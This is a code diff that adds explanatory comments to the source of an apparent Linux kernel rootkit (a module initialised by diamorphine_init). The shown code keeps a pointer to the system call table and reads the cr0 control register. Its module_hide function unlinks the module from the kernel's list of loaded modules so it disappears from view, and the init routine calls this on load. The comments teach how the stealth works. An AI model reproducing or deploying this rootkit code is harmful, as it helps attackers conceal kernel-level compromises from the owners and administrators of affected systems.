@@ -35,7 +35,7 @@
 unsigned long cr0;
 #endif
 
-static unsigned long *__sys_call_table;
+static unsigned long *__sys_call_table; // pointer to the system call table
 
 #if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
 typedef asmlinkage long (*t_syscall)(const struct pt_regs *);
@@ -320,9 +320,16 @@ void module_show(void)
 	module_hidden = 0;
 }
 
+/**
+ * Function to hide the kernel module by removing it from the kernel's list of loaded modules.
+ */
 void module_hide(void)
 {
+	// Saves the previous module in the linked list of modules. THIS_MODULE is a macro that points to the module structure of the current module. THIS_MODULE->list accesses the list node that represents the module in the linked list of modules. THIS_MODULE->list.prev points to the previous module in the list.
+	// The code saves the address of the previous module in the module_previous variable for later use in restoring the module's position in the list.
 	module_previous = THIS_MODULE->list.prev;
+
+	// Removes the current module from the linked list of modules. The list_del function takes a pointer to the list node to be removed. By passing &THIS_MODULE->list, the function unlinks the current module from the list of modules.
 	list_del(&THIS_MODULE->list);
 	module_hidden = 1;
 }
@@ -408,9 +415,11 @@ static int __init diamorphine_init(void)
 		return -1;
 
 #if IS_ENABLED(CONFIG_X86) || IS_ENABLED(CONFIG_X86_64)
+	// reads the value of the cr0 register by calling the read_cr0() function and assigns it to the variable cr0. The cr0 register is a control register in x86 architecture that contains various control flags for the CPU, such as enabling or disabling paging, protection levels, and other critical system settings.
 	cr0 = read_cr0();
 #endif
 
+	// hides the module from the kernel's list of loaded modules
 	module_hide();
 	tidy();
 
